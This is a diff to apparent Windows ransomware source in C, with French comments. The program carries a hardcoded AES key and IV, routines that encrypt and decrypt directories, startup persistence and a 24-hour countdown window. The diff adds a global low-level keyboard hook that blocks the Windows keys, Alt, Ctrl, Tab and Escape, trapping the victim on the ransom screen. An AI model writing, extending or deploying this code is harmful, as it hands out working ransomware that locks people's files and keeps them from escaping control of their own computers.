@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <winuser.h>
 #include <time.h>
 #include <stdio.h>
 #include "ransomware.h"
@@ -9,8 +10,10 @@ unsigned char key[KEY_SIZE] = "0123456789abcdef0123456789abcdef"; // Clé AES 25
 unsigned char iv[IV_SIZE] = "abcdef9876543210";                  // IV AES 128 bits
 int encryption_done = 0;
 time_t end_time;
+HHOOK hKeyboardHook; // Hook global pour bloquer les raccourcis clavier
 
 // Prototypes
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
 void perform_encryption(const char *directory, unsigned char *key, unsigned char *iv);
 void perform_decryption(const char *directory, unsigned char *key, unsigned char *iv);
@@ -20,8 +23,15 @@ void add_to_startup(const char *exe_path);
 int main() {
 
     // Configure la console en UTF-8
-    SetConsoleOutputCP(CP_UTF8);
-    SetConsoleCP(CP_UTF8);
+    //SetConsoleOutputCP(CP_UTF8);
+    //SetConsoleCP(CP_UTF8);
+
+    // Initialise le hook clavier
+    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+    if (!hKeyboardHook) {
+        fprintf(stderr, "Erreur lors de l'installation du hook clavier.\n");
+        return 1;
+    }
 
     // Calcul de la fin du chrono (24 heures)
     time_t now = time(NULL);
@@ -74,6 +84,8 @@ int main() {
         DispatchMessage(&msg);
     }
 
+    UnhookWindowsHookEx(hKeyboardHook); //Supprime le hook à la fin
+
     return 0;
 }
 
@@ -109,7 +121,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 
             // Définir une police pour le texte
             hFont = CreateFont(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
-                               CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, "Arial");
+                               CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, "Arial Unicode MS");
             break;
         }
         case WM_COMMAND: {
@@ -172,4 +184,22 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             return DefWindowProc(hwnd, uMsg, wParam, lParam);
     }
     return 0;
+}
+
+ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0) {
+        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            switch (pKeyBoard->vkCode) {
+                case VK_LWIN: // Bloque la touche Windows gauche
+                case VK_RWIN: // Bloque la touche Windows droite
+                case VK_TAB:  // Bloque Alt+Tab
+                case VK_ESCAPE: // Bloque Alt+Escape
+                case VK_CONTROL: // Bloque Ctrl
+                case VK_MENU:    // Bloque Alt
+                    return 1; // Empêche le traitement par le système
+            }
+        }
+    }
+    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
 }
